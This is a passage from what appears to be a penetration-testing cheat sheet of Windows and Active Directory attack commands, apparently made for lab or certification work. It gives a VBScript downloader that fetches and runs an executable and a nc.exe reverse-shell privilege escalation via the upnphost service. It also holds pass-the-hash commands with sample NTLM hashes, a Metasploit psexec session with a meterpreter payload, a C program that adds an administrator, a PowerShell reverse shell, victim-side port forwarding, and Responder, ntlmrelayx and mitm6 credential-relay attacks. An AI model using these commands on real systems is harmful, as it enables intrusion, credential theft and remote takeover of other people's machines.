<span class="n">echo</span><span class="w"> </span><span class="n">If</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="n">Is</span><span class="w"> </span><span class="n">Nothing</span><span class="w"> </span><span class="n">Then</span><span class="w"> </span><span class="n">Set</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateObject</span><span class="p">(</span><span class="s2">&quot;MSXML2.ServerXMLHTTP&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">If</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="n">Is</span><span class="w"> </span><span class="n">Nothing</span><span class="w"> </span><span class="n">Then</span><span class="w"> </span><span class="n">Set</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateObject</span><span class="p">(</span><span class="s2">&quot;Microsoft.XMLHTTP&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">http</span><span class="o">.</span><span class="n">Open</span><span class="w"> </span><span class="s2">&quot;GET&quot;</span><span class="p">,</span><span class="n">strURL</span><span class="p">,</span><span class="n">False</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">http</span><span class="o">.</span><span class="n">Send</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">varByteArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">http</span><span class="o">.</span><span class="n">ResponseBody</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">Set</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Nothing</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">Set</span><span class="w"> </span><span class="n">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateObject</span><span class="p">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">Set</span><span class="w"> </span><span class="n">ts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fs</span><span class="o">.</span><span class="n">CreateTextFile</span><span class="p">(</span><span class="n">StrFile</span><span class="p">,</span><span class="n">True</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">strData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">strBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">For</span><span class="w"> </span><span class="n">lngCounter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">UBound</span><span class="p">(</span><span class="n">varByteArray</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">ts</span><span class="o">.</span><span class="n">Write</span><span class="w"> </span><span class="n">Chr</span><span class="p">(</span><span class="mi">255</span><span class="w"> </span><span class="n">And</span><span class="w"> </span><span class="n">Ascb</span><span class="p">(</span><span class="n">Midb</span><span class="p">(</span><span class="n">varByteArray</span><span class="p">,</span><span class="n">lngCounter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">Next</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">ts</span><span class="o">.</span><span class="n">Close</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>

<span class="c1"># Execute</span>
<span class="n">cscript</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="o">/</span><span class="n">file</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="n">file</span><span class="o">.</span><span class="n">exe</span>
</code></pre></div>

<h3>Windowss XP SP1 PrivEsc</h3>
<div class="highlight"><pre><span></span><code>sc<span class="w"> </span>config<span class="w"> </span>upnphost<span class="w"> </span><span class="nv">binpath</span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;C:\Inetpub\wwwroot\nc.exe 10.11.1.111 4343 -e C:\WINDOWS\System32\cmd.exe&quot;</span>
sc<span class="w"> </span>config<span class="w"> </span>upnphost<span class="w"> </span><span class="nv">obj</span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;.\LocalSystem&quot;</span><span class="w"> </span><span class="nv">password</span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
sc<span class="w"> </span>qc<span class="w"> </span>upnphost
sc<span class="w"> </span>config<span class="w"> </span>upnphost<span class="w"> </span><span class="nv">depend</span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
net<span class="w"> </span>start<span class="w"> </span>upnphost
</code></pre></div>

<h3>Pass The Hash</h3>
<div class="highlight"><pre><span></span><code><span class="cp"># Login as user only with hashdump</span>
<span class="cp"># From this hashdump</span>
<span class="cp"># admin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::</span>

<span class="cp">## CRACK MAP EXEC</span>

<span class="n">crackmapexec</span><span class="w"> </span><span class="n">smb</span><span class="w"> </span><span class="mf">192.168.68.122</span><span class="mi">-126</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">fcastle</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">MARVEL</span><span class="p">.</span><span class="n">local</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="o">&lt;</span><span class="n">NTLM</span><span class="w"> </span><span class="n">Hash</span><span class="o">&gt;</span><span class="w"> </span><span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">auth</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">machines</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">dual</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">same</span><span class="w"> </span><span class="n">hash</span><span class="p">;</span><span class="w"> </span><span class="o">--</span><span class="n">sam</span><span class="w"> </span><span class="p">(</span><span class="n">dump</span><span class="w"> </span><span class="n">SAM</span><span class="w"> </span><span class="n">file</span><span class="p">)</span>

<span class="n">crackmapexec</span><span class="w"> </span><span class="n">smb</span><span class="w"> </span><span class="mf">192.168.68.122</span><span class="mi">-126</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">fcastle</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">MARVEL</span><span class="p">.</span><span class="n">local</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">&lt;</span><span class="n">P</span><span class="p">@</span><span class="n">ssw0rd1</span><span class="o">&gt;</span>

<span class="cp">## PSEXEC</span>

<span class="n">psexec</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="s">&quot;frank castle&quot;</span><span class="o">:</span><span class="mf">@192.168.68.122</span><span class="w"> </span><span class="o">-</span><span class="n">hashes</span><span class="w"> </span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="o">:</span><span class="n">ae974876d974abd805a989ebead86846</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="n">attempt</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">gain</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">shell</span>

<span class="cp">## Pth-Winexe</span>

<span class="n">pth</span><span class="o">-</span><span class="n">winexe</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="n">Administrator</span><span class="o">%</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="o">:</span><span class="n">ee0c207898a5bccc01f38115019ca2fb</span><span class="w"> </span><span class="c1">//10.11.1.24 cmd</span>

<span class="cp">##Evil-Winrm</span>

<span class="n">evil</span><span class="o">-</span><span class="n">winrm</span><span class="w">  </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="mf">192.168.1.100</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">Administrator</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="err">&#39;</span><span class="n">MySuperSecr3tPass123</span><span class="o">!</span><span class="err">&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="err">&#39;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">foo</span><span class="o">/</span><span class="n">ps1_scripts</span><span class="o">/</span><span class="err">&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="err">&#39;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">foo</span><span class="o">/</span><span class="n">exe_files</span><span class="o">/</span><span class="err">&#39;</span>

<span class="n">evil</span><span class="o">-</span><span class="n">winrm</span><span class="w">  </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="mf">192.168.1.100</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">Administrator</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="o">:</span><span class="n">ae974876d974abd805a989ebead86846</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="err">&#39;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">foo</span><span class="o">/</span><span class="n">ps1_scripts</span><span class="o">/</span><span class="err">&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="err">&#39;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">foo</span><span class="o">/</span><span class="n">exe_files</span><span class="o">/</span><span class="err">&#39;</span>

<span class="cp">## Impacket-PSexec:</span>

<span class="n">python3</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">impacket</span><span class="o">/</span><span class="n">impacket</span><span class="o">/</span><span class="n">examples</span><span class="o">/</span><span class="n">psexec</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="s">&quot;Administrator&quot;</span><span class="o">:</span><span class="mf">@10.11.1.121</span><span class="w"> </span><span class="o">-</span><span class="n">hashes</span><span class="w"> </span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="o">:</span><span class="mf">57321e6</span><span class="n">a0eef2c45985c9fa49c5cd24f</span><span class="w"> </span><span class="err">#</span><span class="n">upload</span><span class="o">/</span><span class="n">download</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">access</span>


<span class="n">msf5</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">psexec</span>
<span class="n">msf5</span><span class="w"> </span><span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">psexec</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">options</span>

<span class="n">Module</span><span class="w"> </span><span class="n">options</span><span class="w"> </span><span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">psexec</span><span class="p">)</span><span class="o">:</span>

<span class="w">   </span><span class="n">Name</span><span class="w">                  </span><span class="n">Current</span><span class="w"> </span><span class="n">Setting</span><span class="w">  </span><span class="n">Required</span><span class="w">  </span><span class="n">Description</span>
<span class="w">   </span><span class="o">----</span><span class="w">                  </span><span class="o">---------------</span><span class="w">  </span><span class="o">--------</span><span class="w">  </span><span class="o">-----------</span>
<span class="w">   </span><span class="n">RHOSTS</span><span class="w">                                 </span><span class="n">yes</span><span class="w">       </span><span class="n">The</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="n">range</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">CIDR</span><span class="w"> </span><span class="n">identifier</span>
<span class="w">   </span><span class="n">RPORT</span><span class="w">                 </span><span class="mi">445</span><span class="w">              </span><span class="n">yes</span><span class="w">       </span><span class="n">The</span><span class="w"> </span><span class="n">SMB</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span>
<span class="w">   </span><span class="n">SERVICE_DESCR10</span><span class="mf">.11.1.111</span><span class="n">TION</span><span class="w">                    </span><span class="n">no</span><span class="w">        </span><span class="n">Service</span><span class="w"> </span><span class="n">description</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">pretty</span><span class="w"> </span><span class="n">listing</span>
<span class="w">   </span><span class="n">SERVICE_DISPLAY_NAME</span><span class="w">                   </span><span class="n">no</span><span class="w">        </span><span class="n">The</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">display</span><span class="w"> </span><span class="n">name</span>
<span class="w">   </span><span class="n">SERVICE_NAME</span><span class="w">                           </span><span class="n">no</span><span class="w">        </span><span class="n">The</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">name</span>
<span class="w">   </span><span class="n">SHARE</span><span class="w">                 </span><span class="n">ADMIN$</span><span class="w">           </span><span class="n">yes</span><span class="w">       </span><span class="n">The</span><span class="w"> </span><span class="n">share</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">connect</span><span class="w"> </span><span class="n">to</span><span class="p">,</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">admin</span><span class="w"> </span><span class="n">share</span><span class="w"> </span><span class="p">(</span><span class="n">ADMIN$</span><span class="p">,</span><span class="n">C$</span><span class="p">,...)</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">normal</span><span class="w"> </span><span class="n">read</span><span class="o">/</span><span class="n">write</span><span class="w"> </span><span class="n">folder</span><span class="w"> </span><span class="n">share</span>
<span class="w">   </span><span class="n">SMBDomain</span><span class="w">             </span><span class="p">.</span><span class="w">                </span><span class="n">no</span><span class="w">        </span><span class="n">The</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">domain</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">authentication</span>
<span class="w">   </span><span class="n">SMBPass</span><span class="w">                                </span><span class="n">no</span><span class="w">        </span><span class="n">The</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">specified</span><span class="w"> </span><span class="n">username</span>
<span class="w">   </span><span class="n">SMBUser</span><span class="w">                                </span><span class="n">no</span><span class="w">        </span><span class="n">The</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">authenticate</span><span class="w"> </span><span class="n">as</span>

<span class="n">Exploit</span><span class="w"> </span><span class="n">target</span><span class="o">:</span>

<span class="w">   </span><span class="n">Id</span><span class="w">  </span><span class="n">Name</span>
<span class="w">   </span><span class="o">--</span><span class="w">  </span><span class="o">----</span>
<span class="w">   </span><span class="mi">0</span><span class="w">   </span><span class="n">Automatic</span>

<span class="n">msf5</span><span class="w"> </span><span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">psexec</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">rhosts</span><span class="w"> </span><span class="mf">10.10.0.100</span>
<span class="n">rhosts</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="mf">10.10.0.100</span>

<span class="n">msf5</span><span class="w"> </span><span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">psexec</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">smbuser</span><span class="w"> </span><span class="n">admin2</span>

<span class="n">smbuser</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">admin2</span>

<span class="n">msf5</span><span class="w"> </span><span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">psexec</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">smbpass</span><span class="w"> </span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="o">:</span><span class="mi">7178</span><span class="n">d3046e7ccfac0469f95588b6bdf7</span>

<span class="n">smbpass</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="o">:</span><span class="mi">7178</span><span class="n">d3046e7ccfac0469f95588b6bdf7</span>

<span class="n">msf5</span><span class="w"> </span><span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">psexec</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>

<span class="n">payload</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
</code></pre></div>

<h3>Scripts</h3>
<h4>Useradd</h4>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="c1"> /* system, NULL, EXIT_FAILURE */</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="w"> </span><span class="p">()</span>
<span class="p">{</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
<span class="w">  </span><span class="n">i</span><span class="o">=</span><span class="n">system</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;net user &lt;username&gt; &lt;password&gt; /add &amp;&amp; net localgroup administrators &lt;username&gt; /add&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp"># Compile Exploit</span>
<span class="n">i686</span><span class="o">-</span><span class="n">w64</span><span class="o">-</span><span class="n">mingw32</span><span class="o">-</span><span class="n">gcc</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">useradd</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="n">useradd</span><span class="p">.</span><span class="n">c</span>

<span class="n">i686</span><span class="o">-</span><span class="n">w64</span><span class="o">-</span><span class="n">mingw32</span><span class="o">-</span><span class="n">gcc</span><span class="w"> </span><span class="mf">40564.</span><span class="n">c</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">exp</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="n">lws2_32</span><span class="w"> </span><span class="err">#</span><span class="n">Win</span><span class="w"> </span><span class="n">cross</span><span class="w"> </span><span class="n">compiler</span>
</code></pre></div>

<h4>Powershell Run As</h4>
<div class="highlight"><pre><span></span><code>echo $username = &#39;&lt;username&gt;&#39; &gt; runas.ps1
echo $securePassword = ConvertTo-SecureString &quot;&lt;password&gt;&quot; -AsPlainText -Force &gt;&gt; runas.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword &gt;&gt; runas.ps1
echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential &gt;&gt; runas.ps1
</code></pre></div>

<h4>Powershell Reverse Shell</h4>
<div class="highlight"><pre><span></span><code><span class="nb">Set-ExecutionPolicy</span> <span class="n">Bypass</span>

<span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s1">&#39;10.11.1.111&#39;</span><span class="p">,</span><span class="n">4444</span><span class="p">);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s1">&#39;PS &#39;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
</code></pre></div>

<h3>Windows privesc/enum tools</h3>
<ul>
<li><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py">windows-exploit-suggester</a></li>
<li><a href="https://github.com/pentestmonkey/windows-privesc-check">windows-privesc-check</a></li>
<li><a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">PowerUp</a></li>
</ul>
<h3>Windows precompiled exploits</h3>
<ul>
<li><a href="https://github.com/abatchy17/WindowsExploits">WindowsExploits</a></li>
<li><a href="https://github.com/nomi-sec/PoC-in-GitHub">WindowsExploits</a></li>
<li><a href="https://github.com/SecWiki/windows-kernel-exploits">WindowsExploits</a></li>
<li><a href="https://github.com/Ascotbe/Kernelhub">WindowsExploits</a></li>
</ul>
<h3>Port Forwarding</h3>
<h2>Windows</h2>
<p>Run in victim:
<code>cmd.exe /c echo y | plink.exe -ssh -l kali -pw P@ssw0rd1234 -R 10.10.16.155:1445:127.0.0.1:445 10.10.16.155</code> #Opens port 1445 on kali to 445 on victim</p>
<p><code>plink -l LOCALUSER -pw LOCALPASSWORD LOCALIP -R 5985:127.0.0.1:5985 -P 221</code></p>
<p><code>plink.exe -l kali -pw P@$$word -R 8080:127.0.0.1:445 10.10.16.155</code></p>
<p><code>ssh -l kali -pw P@$$word -R 445:127.0.0.1:445 10.10.16.155</code> #port forward</p>
<h1>NETSH PORT FWD</h1>
<p><strong><em>IP Helper Svc and IPv6 Support must be enabled (default on Windows)</em></strong>
<code>netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110</code> #Opens 4455 on Win client to fwd 445 to dest client
<code>netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow</code> #ALlow inbound connections on 4455</p>
<h1>On kali make sure '/etc/samba/smb.conf' is set to 'min protocol = SMB2' before connecting</h1>
<h2>Linux</h2>
<h1>Socks Proxy</h1>
<p><code>sudo sshuttle -r sean@10.11.1.251 10.1.1.0/24 -v</code> ## Requires PW of user; Socks Proxy to entire subnetwork from kali</p>
<p><code>ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i id_rsa kali@192.168.119.137</code>  #Run on victim </p>
<p><code>proxychains nmap --top-ports=20 -sT -Pn 10.1.1.68</code>  #Make sure "sT" &amp; "Pn" is configured when ran from kali &amp; proxy port is in /etc/proxychains.conf file</p>
<h1>Remote Port Forward:</h1>
<p><code>ssh-keygen</code> # From victim machine; create keys to allow ssh connection</p>
<p><code>from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa &lt;id_rsa.pub result&gt;</code>  #Placed in kali known_hosts/authorized_keys file</p>
<p><code>ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/thunda/id_rsa kali@192.168.119.209</code>  #CMD ran in victim for port fwd</p>
<p><code>mysql --host=127.0.0.1 --port=13306 --user=wp -p</code>  #Connection using port forward</p>
<h1><strong>Active Directory</strong></h1>
<p>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md</p>
<h2>LLMNR/NBT-NS</h2>
<div class="highlight"><pre><span></span><code>responder -I eth0 -rdwv #Credential default capture settings
</code></pre></div>

<h2>SMB Relay Attack</h2>
<div class="highlight"><pre><span></span><code>python3 /home/kali/.local/bin/ntlmrelayx.py -tf targets.txt -smb2support #Capture creds via SMB (Signing must be &#39;disabled/not required&#39;)

python3 /home/kali/.local/bin/ntlmrelayx.py -tf targets.txt -smb2support -i # Gain a interactive shell with &quot;-i&quot;
</code></pre></div>

<h2>IPv6 Attack</h2>
<div class="highlight"><pre><span></span><code>https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/

sudo mitm6 -d marvel.local #Run mitm6 first to IPv6 server

python3 /home/kali/.local/bin/ntlmrelayx.py -6 -t ldaps://192.168.68.122 -wh fakewpad.marvel.local -l lootme # Captures IPv6 request to capture &amp; dump creds to lootme
</code></pre></div>

<h2>AD Recon</h2>
<p>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#active-directory-attacks</p>
<p>https://github.com/61106960/adPEAS #asPeas for enumeration scripting</p>
<h3>PowerView</h3>
